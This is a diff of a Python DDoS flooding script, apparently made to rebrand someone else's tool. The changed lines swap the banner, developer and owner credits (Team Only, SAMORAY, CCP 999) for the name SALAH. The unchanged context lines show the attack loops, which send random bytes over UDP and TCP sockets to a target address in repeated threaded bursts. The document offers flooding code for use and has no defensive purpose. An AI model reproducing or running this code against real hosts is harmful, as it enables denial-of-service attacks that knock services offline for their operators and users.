@@ -12,7 +12,7 @@ import os
 ###### TEAM ONLY!!! #####
 os.system("clear")
 os.system("None")
-print("\033[32m DDoS Team丶Only丶Is Loding ")
+print("\033[32m DDoS SALAH丶Is Loding ")
 time.sleep(2)
 print("Loading...")
 os.system("clear")
@@ -63,8 +63,8 @@ else :
  ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁  
 	
-	Devloper : SAMORAY
-    Owner : CCP 999
+	Devloper : SALAH
+    Owner : SALAH
 			""")
 
 
@@ -87,7 +87,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +"TEAM '\033[31m ONLY' TA9TA7EM!!!!")
 		except:
-			print("[!] TEAM ONLY TA9TA7EM!!!!")
+			print("[!] SALAH TA9TA7EM!!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -99,10 +99,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"TEAM '\033[32m ONLY' TA9TA7EM!!!!")
+			print(i +"TEAM '\033[32m SALAH' TA9TA7EM!!!!")
 		except:
 			s.close()
-			print("[*] TEAM ONLY TA9TA7EM!!!!")
+			print("[*] SALAH Y9TA7EM!!!!")
             
 for y in range(threads):
 	if choice == 'y':
